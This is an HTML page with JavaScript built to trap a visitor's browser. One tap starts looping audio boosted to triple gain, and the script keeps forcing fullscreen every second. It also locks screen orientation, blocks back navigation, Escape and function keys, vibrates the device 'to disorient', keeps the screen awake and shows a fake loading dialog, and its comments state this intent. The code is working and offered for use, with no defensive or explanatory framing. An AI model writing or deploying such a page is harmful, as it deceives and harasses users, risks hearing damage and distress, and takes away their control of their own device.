<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body, html {
            width: 100%;
            height: 100%;
            background-color: black;
            overflow: hidden;
            user-select: none;
            -webkit-user-select: none;
            -webkit-touch-callout: none;
            touch-action: none;
        }

        #tap-target {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 9999;
            cursor: pointer;
        }
        
        /* Fake system dialog to trick user into staying */
        #fake-dialog {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #333;
            color: white;
            padding: 20px;
            border-radius: 10px;
            font-family: system-ui, -apple-system, sans-serif;
            text-align: center;
            z-index: 10000;
        }
    </style>
</head>
<body>
    <div id="tap-target"></div>
    <div id="fake-dialog">Loading...<br>Please wait</div>

<script>
    const tapTarget = document.getElementById('tap-target');
    const fakeDialog = document.getElementById('fake-dialog');
    
    // Web Audio API for volume boost beyond 1.0
    let audioContext, gainNode, source;
    let isTrapped = false;
    
    // Initialize Web Audio with maximum gain
    function initWebAudio(audioElement) {
        audioContext = new (window.AudioContext || window.webkitAudioContext)();
        source = audioContext.createMediaElementSource(audioElement);
        gainNode = audioContext.createGain();
        
        // Boost volume significantly (2.0 = 200%, 3.0 = 300%, etc.)
        gainNode.gain.value = 3.0;
        
        source.connect(gainNode);
        gainNode.connect(audioContext.destination);
    }
    
    const audio = new Audio('gg.mp3');
    audio.loop = true;
    audio.volume = 1.0;
    
    // Prevent sleep/screen lock
    function keepAwake() {
        if (navigator.wakeLock) {
            navigator.wakeLock.request('screen').catch(() => {});
        }
        // Fallback: keep screen alive with video trick
        const video = document.createElement('video');
        video.src = 'data:video/mp4;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJlZQAACKBtZGF0AAAC';
        video.loop = true;
        video.play().catch(() => {});
    }
    
    // Aggressive fullscreen with orientation lock
    function enterFullscreen() {
        const elem = document.documentElement;
        
        // Request fullscreen on both document and body
        const reqs = [
            elem.requestFullscreen,
            elem.webkitRequestFullscreen,
            elem.mozRequestFullScreen,
            elem.msRequestFullscreen
        ];
        
        reqs.forEach(req => {
            if (req) {
                try {
                    req.call(elem).catch(() => {});
                } catch(e) {}
            }
        });
        
        // Lock orientation to trap user
        if (screen.orientation && screen.orientation.lock) {
            screen.orientation.lock('landscape').catch(() => {
                screen.orientation.lock('portrait').catch(() => {});
            });
        }
        
        // iOS Safari specific
        if (window.navigator.standalone === false) {
            window.scrollTo(0, 0);
        }
    }
    
    // Prevent all exit attempts
    function preventEscape(e) {
        if (!isTrapped) return;
        
        e.preventDefault();
        e.stopPropagation();
        
        // Re-enter fullscreen if they escape
        setTimeout(enterFullscreen, 100);
        
        // Vibrate to disorient
        if (navigator.vibrate) {
            navigator.vibrate([200, 100, 200, 100, 500]);
        }
        
        return false;
    }
    
    // Block navigation
    history.pushState(null, '', location.href);
    window.onpopstate = function() {
        history.pushState(null, '', location.href);
        enterFullscreen();
    };
    
    // Block keys that could exit (Escape, Back, Home, etc.)
    document.addEventListener('keydown', function(e) {
        const blocked = [27, 8, 36, 37, 38, 39, 40, 116, 112, 113, 114, 115, 117, 118, 119, 120, 121, 122, 123];
        if (blocked.includes(e.keyCode) || e.key === 'Escape' || e.key === 'Backspace' || e.key === 'F5') {
            e.preventDefault();
            return false;
        }
    }, true);
    
    // Block context menu
    document.addEventListener('contextmenu', e => {
        e.preventDefault();
        return false;
    }, true);
    
    // Block various touch gestures that might exit
    document.addEventListener('touchstart', function(e) {
        if (e.touches.length > 1) e.preventDefault();
    }, { passive: false });
    
    document.addEventListener('touchmove', function(e) {
        e.preventDefault();
    }, { passive: false });
    
    document.addEventListener('gesturestart', preventEscape);
    document.addEventListener('gesturechange', preventEscape);
    document.addEventListener('gestureend', preventEscape);
    
    // Visibility change - reactivate immediately
    document.addEventListener('visibilitychange', function() {
        if (document.hidden && isTrapped) {
            // Try to bring back immediately
            setTimeout(() => {
                enterFullscreen();
                audio.play().catch(() => {});
            }, 100);
        }
    });
    
    // Before unload - prevent leaving
    window.onbeforeunload = function() {
        return "Are you sure?";
    };
    
    // Main activation
    tapTarget.addEventListener('click', function() {
        isTrapped = true;
        
        // Initialize Web Audio for volume boost
        initWebAudio(audio);
        
        // Start audio
        audio.play().then(() => {
            // Hide tap target
            tapTarget.style.display = 'none';
            fakeDialog.style.display = 'block';
            
            // Enter fullscreen
            enterFullscreen();
            keepAwake();
            
            // Continuous fullscreen enforcement
            setInterval(enterFullscreen, 1000);
            
            // Vibrate pattern
            if (navigator.vibrate) {
                navigator.vibrate([500, 200, 500, 200, 1000]);
            }
            
            // Fake dialog disappears
            setTimeout(() => {
                fakeDialog.style.display = 'none';
            }, 2000);
            
        }).catch(err => {
            console.log("Audio failed:", err);
        });
    });
    
    // Handle iOS audio context resume
    document.addEventListener('click', function() {
        if (audioContext && audioContext.state === 'suspended') {
            audioContext.resume();
        }
    }, { once: true });
</script>
</body>
</html>
